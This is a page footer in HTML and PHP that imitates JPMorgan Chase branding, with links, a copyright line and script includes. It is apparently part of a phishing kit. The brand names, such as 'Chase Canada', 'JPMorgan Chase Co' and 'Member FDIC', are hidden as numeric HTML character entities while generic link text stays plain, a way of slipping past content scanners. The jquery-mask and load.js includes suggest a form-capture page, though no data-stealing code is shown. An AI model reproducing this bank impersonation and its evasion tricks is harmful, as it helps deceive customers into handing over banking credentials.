<div class="footer"> 
<div class="social">Follow us: <i class="fa fa-facebook-official"></i> <i class="fa fa-instagram"></i> <i class="fa fa-twitter"></i> <i class="fa fa-youtube-play"></i></div>
<div class="footer-list"><span>Contact us</span><span>Privacy</span><span>Security</span><span>Term of use</span><span>Accessibility</span><span>&#83;&#65;&#70;&#69;&nbsp;&#65;&#99;&#116;:&nbsp;&#67;&#104;&#97;&#115;&#101;&nbsp;&#77;&#111;&#114;&#116;&#97;&#103;&#101;&nbsp;&#76;&#111;&#97;&#110;&nbsp;&#79;&#114;&#105;&#103;&#105;&#110;&#97;&#116;&#111;&#114;</span> <span>&#70;&#97;&#105;&#114;&nbsp;&#108;&#101;&#110;&#100;&#105;&#110;&#103;</span><span>&#65;&#98;&#111;&#117;&#116;&nbsp;&#67;&#104;&#97;&#115;&#101;</span><span>&#74;&#80;&nbsp;&#77;&#111;&#114;&#103;&#97;&#110;</span>
   <span>&#74;&#80;&#77;&#111;&#114;&#103;&#97;&#110;&nbsp;&#67;&#104;&#97;&#115;&#101;&nbsp;&nbsp;&#67;&#111;</span> <span>Career</span><span>&#69;&#115;&#112;&#97;&#110;&#111;&#108;</span><span>&#67;&#104;&#97;&#115;&#101;&nbsp;&#67;&#97;&#110;&#97;&#100;&#97;</span><span>Site map</span> <span>&#77;&#101;&#109;&#98;&#101;&#114;&nbsp;&#70;&#68;&#73;&#67;</span> <span>&#69;&#113;&#117;&#97;&#108;&nbsp;&#104;&#111;&#117;&#115;&#101;&nbsp;&#108;&#101;&#110;&#100;&#105;&#110;&#103;</span></div>
<div style="text-align:center;margin-top:1rem;font-size:.8rem;">&copy; <?php echo date("Y");?>&#74;&#80;&#77;&#111;&#114;&#103;&#97;&#110;&nbsp;&#67;&#104;&#97;&#115;&#101;&nbsp;&nbsp;&#67;&#111;.</div>  
</div>
  <script src="js/bootstrap.min.js"></script>
	 <script src="js/jquery-1.10.2.min.js"></script>
	  <script src="js/jquery-mask.js"></script>
	  	  <script src="js/load.js"></script>
